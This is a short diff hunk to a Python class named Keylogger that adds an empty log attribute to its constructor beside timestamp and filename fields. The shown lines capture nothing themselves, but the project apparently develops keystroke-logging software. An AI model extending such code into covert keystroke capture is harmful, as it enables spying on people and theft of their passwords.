@@ -10,6 +10,7 @@ class Keylogger:
         self.end_dt = datetime.now()
         self.filename = ""
         self.running = True
+        self.log = ""
         
     def update_filename(self):
         start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
